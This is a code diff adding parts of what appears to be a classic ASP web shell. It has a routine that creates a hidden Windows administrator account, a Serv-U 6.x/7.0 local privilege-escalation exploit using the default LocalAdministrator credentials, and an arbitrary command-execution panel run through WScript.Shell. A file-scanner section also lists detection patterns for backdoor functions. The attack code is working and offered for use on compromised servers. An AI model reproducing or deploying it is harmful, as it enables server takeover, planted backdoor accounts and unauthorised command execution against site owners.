+	set http=Server.createobject("Microsoft.XMLHTTP") 
+	Http.open "GET",url,false 
+	Http.send() 
+	if Http.readystate<>4 then
+		getHTTPPage=""
+		exit function 
+	end if 
+	getHTTPPage=bytes2BSTR(Http.responseBody) 
+	set http=nothing
+	if err.number<>0 then err.Clear  
+end function 
+
+Function bytes2BSTR(vIn) 
+	dim strReturn 
+	dim i1,ThisCharCode,NextCharCode 
+	strReturn = "" 
+	For i1 = 1 To LenB(vIn) 
+		ThisCharCode = AscB(MidB(vIn,i1,1)) 
+		If ThisCharCode < &H80 Then 
+			strReturn = strReturn & Chr(ThisCharCode) 
+		Else 
+			NextCharCode = AscB(MidB(vIn,i1+1,1)) 
+			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
+			i1 = i1 + 1 
+		End If 
+	Next 
+	bytes2BSTR = strReturn 
+End Function
+
+  Sub AddUser()
+echo"<form action='?action=adduser' method=post><TABLE width=970 border=1><TR><TD colspan=2 class=Td><font face=webdings>8</font>添加用户</TD></TR>"
+echo"<tr><td><center>用户:<input name='username' type='text' value='leaves'></td></tr>"
+echo"<tr><td><center>密码:<input name='passwd' type='text' value='cnsst'></td></tr>"
+echo"<tr><td><center><input type=hidden value=AddUser name=PageName><input type='submit' Value='添 加 用 户'></td></tr></form>"
+on error resume next
+if request.servervariables("REMOTE_ADDR")<>"127.0.0.1" then
+echo "iP !s n0T RiGHt"
+else
+if request("username")<>"" then
+username=request("username")
+passwd=request("passwd")
+Response.Expires=0
+Session.TimeOut=50
+Server.ScriptTimeout=3000
+set lp=Server.CreateObject("WSCRIPT.NETWORK")
+oz="WinNT://"&lp.ComputerName
+Set ob=GetObject(oz)
+Set oe=GetObject(oz&"/Administrators,group")
+Set od=ob.Create("user",username)
+od.SetPassword passwd
+od.SetInfo
+oe.Add oz&"/"&username
+if err then
+echo "<tr><td><font color=red ><center>添加用户失败</font></td></tr>"
+else
+if instr(server.createobject("Wscript.shell").exec("cmd.exe /c net user "&username.stdout.readall),"上次登录")>0 then
+echo "<tr><td><font color=red ><center>虽然没有错误,但是好象也没建立成功.你一定很郁闷吧</font></tr></td>"
+else
+echo "<tr><td><font color=red ><center>OMG!"&username&"帐号建立成功!</font></tr></td>"
+end if
+end if
+else
+   End if
+   End if
+echo "</table>"
+  End Sub
+
+Sub  Dellmm()
+rem ++++++++++++++++++++查找木马结束+++++++++++++++
+			if request("act")<>"scan" then
+echo "<form action="""" method=""post"" name=form1 ><table width=970 border=1><TBODY><TR><TD class=td colSpan=2><font face=webdings>8</font>查找木马-文件搜索</TD></TR><TR><TD  width='20%'>网站根目录;</TD><TD >"&Server.MapPath("/")&"</TD></TR><TR><TD >本程序目录:</TD><TD >"&Server.MapPath(".")&"</TD></TR><TR><TD >填入你要检查的路径:</TD><TD ><input name=""path"" type=""text""  value=""."" size=""30"" /> 填“\”网站根目录；“.”为本程序目录</TD></TR><TR><TD >选择查找对象:</TD><TD ><input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>查ASP 马<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">搜索符合条件之文件</TD></TR><TR><TD ><input type=hidden name=act value=scan><input type=hidden name=PageName value=Dellmm><input type=""submit"" value="" 开始扫描 "" /></TD><TD ><br /><div id=""showFile1"" style=""display:none"">&nbsp;&nbsp;查找内容：<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">要查找的字符串，不填就只进行日期检查<br />&nbsp;&nbsp;修改日期：<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20""> 多个日期用;隔开，任意日期填写 <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />&nbsp;&nbsp;文件类型：<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> 类型之间用,隔开，*表示所有类型<br /><br /></div></TD></TR></TBODY></TABLE></form>"
+	else
+		server.ScriptTimeout = 600
+		if request.Form("path")="" then
+			echo("No Hack")
+			response.End()
+		end if
+		if request.Form("path")="\" then
+			TmpPath = Server.MapPath("\")
+		elseif request.Form("path")="." then
+			TmpPath = Server.MapPath(".")
+		else
+			TmpPath = Server.MapPath("\")&"\"&request.Form("path")
+		end if
+		timer1 = timer
+		Sun = 0
+		SumFiles = 0
+		SumFolders = 1
+		If request.Form("radiobutton") = "sws" Then
+			DimFileExt = "asp,cer,asa,cdx"
+			Call ShowAllFile(TmpPath)
+		Else
+			If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
+				echo("缉捕条件不完全，恕难从命<br><br><a href='javascript:history.go(-1);'>请返回重新输入</a>")
+				response.End()
+			End If
+			DimFileExt = request.Form("Search_fileExt")
+			Call ShowAllFile2(TmpPath)
+		End If
+echo "<TABLE  width='970' border=1>"
+echo "<TR><TD class=td colSpan=4><font face=webdings>8</font>查找木马-文件搜索</TD></TR>"
+echo "<tr><td colSpan=4>"
+echo "<div id=""updateInfo"" style=""background:ffffff;border:1px solid #ffffff;padding:0px;display:none""></div>"
+echo "扫描完毕！一共检查文件夹<font color=""#FF0000"">"&SumFolders&"</font>个，文件<font color=""#FF0000"">"&SumFiles&"</font>个，发现可疑点<font color=""#FF0000"">"&Sun&"</font>个"
+echo "<tr>"
+If request.Form("radiobutton") = "sws" Then
+	echo "<td width=""15%"" >文件相对路径</td><td width=""15%"" >特征码</td><td  >描述</td><td width=""20%"" >创建/修改时间</td>"
+else   
+	echo "<td width=""30%"" >文件相对路径</td><td width=""20%"" >文件创建时间</td><td width=""20%"" >修改时间</td>"
+end if
+	echo "</tr>"
+	echo Report
+	echo "<br/></table>"
+timer2 = timer
+thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
+echo "<br><font style='font-size:12px'>本页执行共用了"&thetime&"毫秒</font>"
+end if
+rem ++++++++++++++++++++查找木马结束+++++++++++++++
+End Sub
+
+
+Sub ShowAllFile(Path)
+	Set F1SO = CreateObject("Scripting.FileSystemObject")
+	if not F1SO.FolderExists(path) then exit sub
+	Set f = F1SO.GetFolder(Path)
+	Set fc2 = f.files
+	For Each myfile in fc2
+		If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
+			Call ScanFile(Path&Temp&"\"&myfile.name, "")
+			SumFiles = SumFiles + 1
+		End If
+	Next
+	Set fc = f.SubFolders
+	For Each f1 in fc
+		ShowAllFile path&"\"&f1.name
+		SumFolders = SumFolders + 1
+    Next
+	Set F1SO = Nothing
+End Sub
+
+Sub ScanFile(FilePath, InFile)
+	If InFile <> "" Then
+		Infiles = "<font color=red>该文件被<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>文件包含执行</font>"
+	End If
+	Set FSO1s = CreateObject("Scripting.FileSystemObject")
+	on error resume next
+	set ofile = FSO1s.OpenTextFile(FilePath)
+	filetxt = Lcase(ofile.readall())
+	If err Then Exit Sub end if
+	if len(filetxt)>0 then
+		filetxt = vbcrlf & filetxt
+		temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
+			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
+				Report = Report&"<tr><td >"&temp&"</td><td >WScr"&DoMyBest&"ipt.Shell 或者 clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td ><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End if
+			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
+				Report = Report&"<tr><td >"&temp&"</td><td >She"&DoMyBest&"ll.Application 或者 clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td ><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End If
+			Set regEx = New RegExp
+			regEx.IgnoreCase = True
+			regEx.Global = True
+			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
+			If regEx.Test(filetxt) Then
+				Report = Report&"<tr><td >"&temp&"</td><td >(vbscript|jscript|javascript).Encode</td><td ><font color=red>似乎脚本被加密了</font>"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End If
+			regEx.Pattern = "\bEv"&"al\b"
+			If regEx.Test(filetxt) Then
+				Report = Report&"<tr><td >"&temp&"</td><td >Ev"&"al</td><td >e"&"val()函数可以执行任意ASP代码，被一些后门利用。其形式一般是：ev"&"al(X)<br>但是javascript代码中也可以使用，有可能是误报。"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End If
+			regEx.Pattern = "[^.]\bExe"&"cute\b"
+			If regEx.Test(filetxt) Then
+				Report = Report&"<tr><td >"&temp&"</td><td >Exec"&"ute</td><td ><font color=red>e"&"xecute()函数可以执行任意ASP代码，被一些后门利用。其形式一般是：ex"&"ecute(X)</font><br>"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End If
+			regEx.Pattern = "\.(Open|Create)TextFile\b"
+			If regEx.Test(filetxt) Then
+				Report = Report&"<tr><td >"&temp&"</td><td >.CreateTextFile|.OpenTextFile</td><td >使用了FSO的CreateTextFile|OpenTextFile函数读写文件"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End If
+			regEx.Pattern = "\.SaveToFile\b"
+			If regEx.Test(filetxt) Then
+				Report = Report&"<tr><td >"&temp&"</td><td >.SaveToFile</td><td >使用了Stream的SaveToFile函数写文件"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End If
+			If regEx.Test(filetxt) Then
+				Report = Report&"<tr><td >"&temp&"</td><td >.Save</td><td >使用了XMLHTTP的Save函数写文件"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+			End If
+			Set regEx = Nothing
+		Set regEx = New RegExp
+		regEx.IgnoreCase = True
+		regEx.Global = True
+		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
+		Set Matches = regEx.Execute(filetxt)
+		For Each Match in Matches
+			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
+			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
+				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
+				SumFiles = SumFiles + 1
+			End If
+		Next
+		Set Matches = Nothing
+		Set regEx = Nothing
+		Set regEx = New RegExp
+		regEx.IgnoreCase = True
+		regEx.Global = True
+		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
+		Set Matches = regEx.Execute(filetxt)
+		For Each Match in Matches
+			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
+			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
+				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
+				SumFiles = SumFiles + 1
+			End If
+		Next
+		Set Matches = Nothing
+		Set regEx = Nothing
+		Set regEx = New RegExp
+		regEx.IgnoreCase = True
+		regEx.Global = True
+		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
+		Set Matches = regEx.Execute(filetxt)
+		For Each Match in Matches
+			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
+			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
+				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
+				SumFiles = SumFiles + 1
+			End If
+		Next
+		Set Matches = Nothing
+		Set regEx = Nothing
+		Set regEx = New RegExp
+		regEx.IgnoreCase = True
+		regEx.Global = True
+		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
+		If regEx.Test(filetxt) Then
+			Report = Report&"<tr><td >"&temp&"</td><td >Server.Exec"&"ute</td><td ><font color=red>不能跟踪检查Server.e"&"xecute()函数执行的文件。请管理员自行检查</font><br>"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+			Sun = Sun + 1
+		End If
+		Set Matches = Nothing
+		Set regEx = Nothing
+		Set XregEx = New RegExp
+		XregEx.IgnoreCase = True
+		XregEx.Global = True
+		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
+		Set XMatches = XregEx.Execute(filetxt)
+		For Each Match in XMatches
+			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
+			srcSeek = InStr(1, tmpLake2, "src", 1)
+			If srcSeek > 0 Then
+				srcSeek2 = instr(srcSeek, tmpLake2, "=")
+				For i = 1 To 50
+					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
+					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
+						Exit For
+					End If
+				Next
+				If tmp = """" Then
+					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
+				Else
+					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
+					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
+					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
+					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
+				End If
+				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
+				SumFiles = SumFiles + 1
+			End If
+		Next
+		Set Matches = Nothing
+		Set regEx = Nothing
+		Set regEx = New RegExp
+		regEx.IgnoreCase = True
+		regEx.Global = True
+		regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
+		Set Matches = regEx.Execute(filetxt)
+		For Each Match in Matches
+			If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
+				Report = Report&"<tr><td >"&temp&"</td><td >Creat"&"eObject</td><td >Crea"&"teObject函数使用了变形技术。可能是误报"&infiles&"</td><td >"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
+				Sun = Sun + 1
+				exit sub
+			End If
+		Next
+		Set Matches = Nothing
+		Set regEx = Nothing
+	end if
+	set ofile = nothing
+	set FSO1s = nothing
+End Sub
+Function CheckExt(FileExt)
+	If DimFileExt = "*" Then CheckExt = True
+	Ext = Split(DimFileExt,",")
+	For i = 0 To Ubound(Ext)
+		If Lcase(FileExt) = Ext(i) Then 
+			CheckExt = True
+			Exit Function
+		End If
+	Next
+End Function
+Function GetDateModify(filepath)
+	Set F2SO = CreateObject("Scripting.FileSystemObject")
+    Set f = F2SO.GetFile(filepath) 
+	s = f.DateLastModified 
+	set f = nothing
+	set F2SO = nothing
+	GetDateModify = s
+End Function
+Function GetDateCreate(filepath)
+	Set F3SO = CreateObject("Scripting.FileSystemObject")
+    Set f = F3SO.GetFile(filepath) 
+	s = f.DateCreated 
+	set f = nothing
+	set F3SO = nothing
+	GetDateCreate = s
+End Function
+Function tURLEncode(Str)
+	temp = Replace(Str, "%", "%25")
+	temp = Replace(temp, "#", "%23")
+	temp = Replace(temp, "&", "%26")
+	tURLEncode = temp
+End Function
+Sub ShowAllFile2(Path)
+	Set F4SO = CreateObject("Scripting.FileSystemObject")
+	if not F4SO.FolderExists(path) then exit sub
+	Set f = F4SO.GetFolder(Path)
+	Set fc2 = f.files
+	For Each myfile in fc2
+		If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
+			Call IsFind(Path&"\"&myfile.name)
+			SumFiles = SumFiles + 1
+		End If
+	Next
+	Set fc = f.SubFolders
+	For Each f1 in fc
+		ShowAllFile2 path&"\"&f1.name
+		SumFolders = SumFolders + 1
+    Next
+	Set F4SO = Nothing
+End Sub
+
+Sub IsFind(thePath)
+	theDate = GetDateModify(thePath)
+	on error resume next
+	theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
+	if err then exit Sub
+	xDate = Split(request.Form("Search_Date"),";")
+	If request.Form("Search_Date") = "ALL" Then ALLTime = True
+	For i = 0 To Ubound(xDate)
+		If theTmp = xDate(i) or ALLTime = True Then 
+			If request("Search_Content") <> "" Then
+				Set FSO2s = CreateObject("Scripting.FileSystemObject")
+				set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
+				filetxt = Lcase(ofile.readall())
+				If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
+					temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
+					Report = Report&"<tr><td >"&temp&"</td><td >"&GetDateCreate(thePath)&"</td><td >"&theDate&"</td></tr>"
+					Sun = Sun + 1
+					Exit Sub
+				End If
+				ofile.close()
+				Set ofile = Nothing
+				Set FSO2s = Nothing
+			Else
+				temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
+				Report = Report&"<tr><td >"&temp&"</td><td >"&GetDateCreate(thePath)&"</td><td >"&theDate&"</td></tr>"
+				Sun = Sun + 1
+				Exit Sub
+			End If
+		End If
+	Next
+End Sub
+	
+	Function ServU1()
+			Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
+dim action
+action=request("action")
+if  not isnumeric(action) then response.end
+user = trim(request("u"))
+pass = trim(request("p"))
+port = trim(request("port"))
+cmd = trim(request("c"))
+f=trim(request("f"))
+if f="" then
+f=gpath()
+else
+   f=left(f,2)
+end if
+ftpport = ffport
+timeout=3
+
+loginuser = "User " & user & vbCrLf
+loginpass = "Pass " & pass & vbCrLf
+deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=" & iip & vbCrLf & " PortNo=" & ftpport & vbCrLf
+mt = "SITE MAINTENANCE" & vbCrLf
+newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=leaves|" & iip & "|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
+newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=luo" & vbCrLf & "-Password=ye" & vbCrLf & _
+        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
+        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
+        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
+        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
+        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
+        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
+quit = "QUIT" & vbCrLf
+newuser=replace(newuser,"c:",f)
+select case action
+case 1
+    set a=Server.CreateObject("Microsoft.XMLHTTP")
+    a.open "GET", "http://127.0.0.1:" & port & "/leaves/upadmin/s1",True, "", ""
+    a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
+    set session("a")=a
+echo "<form method='post' name='leaves'>"
+echo "<input name='u' type='hidden' id='u' value='"&user&"'></td>"
+echo "<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
+echo "<input name='port' type='hidden' id='port' value='"&port&"'></td>"
+echo "<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
+echo "<input name='f' type='hidden' id='f' value='"&f&"' size='50'><input type=hidden value=ServU1 name=PageName>"
+echo "<input name='action' type='hidden' id='action' value='2'></form>"
+echo "<script language='javascript'>"
+echo "document.write('<table width=970 border=1><tr><td colspan=2 class=td><font face=webdings>8</font>Serv-U 6.X 提权脚本 by badwol</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr><TR><td colspan=2>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...</td></tr>');"
+echo "setTimeout('document.all.leaves.submit();',4000);"
+echo "</script>"
+case 2
+    set b=Server.CreateObject("Microsoft.XMLHTTP")
+    b.open "GET", "http://127.0.0.1:" & ftpport & "/leaves/upadmin/s2", True, "", ""
+    b.send "User luo" & vbCrLf & "pass ye" & vbCrLf & "site exec " & cmd & vbCrLf & quit
+   set session("b")=b
+echo "<form method='post' name='leaves'>"
+echo "<input name='u' type='hidden' id='u' value='"&user&"'></td>"
+echo "<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
+echo "<input name='port' type='hidden' id='port' value='"&port&"'></td>"
+echo "<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
+echo "<input name='f' type='hidden' id='f' value='"&f&"' size='50'><input type=hidden value=ServU1 name=PageName>"
+echo "<input name='action' type='hidden' id='action' value='3'></form>"
+echo "<script language='javascript'>"
+echo "document.write('<table width=970 border=1><tr><td colspan=2 class=td><font face=webdings>8</font>Serv-U 6.X 提权脚本 by badwol</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr><TR><td colspan=2> 正在提升权限,请等待...,</td></tr>');"
+echo "setTimeout('document.all.leaves.submit();',4000);"
+echo  "</script>"
+case 3
+    set c=Server.CreateObject("Microsoft.XMLHTTP")
+    c.open "GET", "http://127.0.0.1:" & port & "/leaves/upadmin/s3", True, "", ""
+    c.send loginuser & loginpass & mt & deldomain & quit
+    set session("c")=c
+echo "<table width=970 border=1><tr><td colspan=2 class=td><font face=webdings>8</font>Serv-U 6.X 提权脚本 by badwol</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr><TR><td colspan=2>提权完毕,已执行了命令：<font color=red>"&cmd&"</font>"
+echo "<input type=button value=' 返回继续 ' onClick=""location.href='"&gname()&"';"">"
+echo "</td></tr>"
+case else
+on error resume next
+    set a=session("a")
+    set b=session("b")
+    set c=session("c")
+    a.abort
+    Set a = Nothing
+    b.abort
+    Set b = Nothing
+    c.abort
+    Set c = Nothing
+	
+echo"<table width=970 border=1><form method='post' name='leaves'>"
+echo"<tr><td colspan=2 class=td><font face=webdings>8</font>Serv-U 6.X 提权脚本 by badwol</td></tr>"
+echo"<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
+echo"<tr>"
+echo"<td>用户名:</td>"
+echo"<td><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
+echo"</tr><tr><td>口　令：</td>"
+echo"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
+echo"</tr><tr>"
+echo"<td>端　口：</td>"
+echo"<td><input name='port' type='text' id='port' value='43958'></td></tr>"
+echo"<TR><td>服务器端口：<td><input name='ffport' type='text' id='ffport' value='65500'></td></tr>"
+echo"<TR><td>服务器IP：<td><input name='iip' type='text' id='iip' value='0.0.0.0'></td></tr>"
+echo"</tr><tr >"
+echo"<td>系统路径：</td>"
+echo"<td><input name='f' type='text' id='f' value='"&f&">' size='8'></td>"
+echo"</tr><tr><td>命　令：</td>"
+echo"<td><input name='c' type='text' id='c' value='cmd /c net user leaves cnsst /add & net localgroup administrators leaves /add' size='50'></td>"
+echo"</tr><tr align='center' valign='middle'>"
+echo"<td colspan='2'><input type=hidden value=ServU1 name=PageName><input type='submit' name='Submit' value='提交'>"
+echo"<input type='reset' name='Submit2' value='重置'>"
+echo"<input name='action' type='hidden' id='action' value='1'></td>"
+echo"</tr></form>"
+end select
+	End Function
+				
+Function Gpath()
+on error resume next
+    err.clear
+    set f=Server.CreateObject("Scripting.FileSystemObject")
+    if err.number>0 then
+gpath="c:"
+        exit function
+    end if
+gpath=f.GetSpecialFolder(0)
+gpath=lcase(left(gpath,2))
+set f=nothing
+end function
+Function GName() 
+If request.servervariables("SERVER_PORT")="80" Then 
+GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name")) 
+Else 
+GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name")) 
+End If 
+End Function
+	
+	Function CmdExcute()
+  checked="checked"
+  If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
+  ShellPath=Session("ShellPath")
+  if ShellPath="" Then ShellPath = "cmd.exe"
+  if Request("wscript")<>"yes" then checked=""
+  If Request("cmd")<>"" Then DefCmd = Request("cmd")
+  SI="<table width=970 border=1>"
+  SI=SI&"<form method='post'>"
+  SI=SI&"<tr><td colspan=2 class=td><font face=webdings>8</font>CMD运行</td></tr>"
+  SI=SI&"<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
+  SI=SI&"<tr><td colspan=2>SHELL路径：<input name='SP' value='"&ShellPath&"' Style='width:70%'>&nbsp;&nbsp;"
+  SI=SI&"<input class=c type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell</td></tr>"
+SI=SI&"<tr><Td colspan=2><input name='cmd' Style='width:900px;' value='"&DefCmd&"'><input type=hidden value=CmdExcute name=pageName><input type='submit' value='执行'><textarea Style='width:100%;height:440;'>"
+  If Request.Form("cmd")<>"" Then
+  if Request.Form("wscript")="yes" then
+  Set CM=CreateObject("wscript.shell")
+  Set DD=CM.exec(ShellPath&" /c "&DefCmd)
+  aaa=DD.stdout.readall
+  SI=SI&aaa
+  else
+  	On Error Resume Next
+	Set ws=Server.CreateObject("WScript.Shell")
+	Set ws=Server.CreateObject("WScript.Shell")
+	Set fso=Server.CreateObject("Scripting.FileSystemObject")
+	szTempFile = server.mappath("cmd.txt")
+  Call ws.Run (ShellPath&" /c " & DefCmd & " > " & szTempFile, 0, True)
+  Set fs = CreateObject("Scripting.FileSystemObject")
+  Set oFilelcx = fs.OpenTextFile (szTempFile, 1, False, 0)
+  aaa=Server.HTMLEncode(oFilelcx.ReadAll)
+  oFilelcx.Close
+  Call fso.DeleteFile(szTempFile, True)
+  SI=SI&aaa
+  end if
+  End If
+  SI=SI&chr(13)&"</textarea></Td></tr></form></table>"
+  echo SI
+     End Function
+	
+	 Sub ServU()
+     user = request.Form("duser")
+     pass = request.Form("dpwd")
+     port = request.Form("dport")
+     domain = request.Form("domain")
+     fuser = request.Form("fuser")
+     fpass = request.Form("fpass")
+     fport = request.Form("fport")
+     fpath = request.Form("fpath")
+     privilege=request.Form("privilege")
+      	echo "<table width=970 border=1>"
+		echo  "<form name='form1' method='post' action=''>"
+		echo "<tr><td colspan=2 class=td><font face=webdings>8</font>Serv-U 7.0 EXP Local Add User with ASP</td>"
+		echo "<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
+		echo "<tr><td>user:</td><td><input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'></td></tr>"
+		echo "<tr><td> pwd :</td><td><input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'></td></tr>"
+		echo "<tr><td> port:</td><td> <input name='dport' type='text' class='TextBox' id='dport' value='43958'></td></tr>"
+		echo "<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
+		echo "<tr><td> Domain: &nbsp;</td><td><input name='domain' type='text' class='TextBox' id='domain' value='secdst' /></td></tr>"
+		echo "<tr><td> FTP USER:</td><td><input name='fuser' type='text' class='TextBox' id='fuser' value='admin'></td></tr>"
+		echo "<tr><td> FTP PASS:</td><td><input name='fpass' type='text' class='TextBox' id='fpass' value='admin'></td></tr>"
+		echo "<tr><td> FTP PORT:</td><td><input name='fport' type='text' class='TextBox' id='fport' value='21'></td></tr>"
